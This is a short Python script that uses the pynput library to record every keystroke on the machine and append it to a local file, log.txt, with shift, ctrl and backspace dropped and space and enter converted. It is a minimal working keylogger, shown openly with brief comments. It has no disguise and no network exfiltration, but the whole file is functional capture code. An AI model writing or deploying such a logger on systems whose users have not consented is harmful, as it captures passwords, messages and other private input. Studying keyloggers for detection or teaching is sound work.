from pynput.keyboard import Listener

#storing keystrokes in text file
# r - reading
# w - writing
# a- appending to a file
def writetofile(key):
    keydata=str(key)
    keydata=keydata.replace("'","")

    if keydata == "Key.shift":
        keydata=""
    if keydata == "Key.space":
        keydata=" "
    if keydata == "Key.enter":
        keydata="\n"
    if keydata == "Key.backspace":
        keydata=""
    if keydata == "Key.ctrl_l":
        keydata=""

    with open("log.txt",'a') as f:
        f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()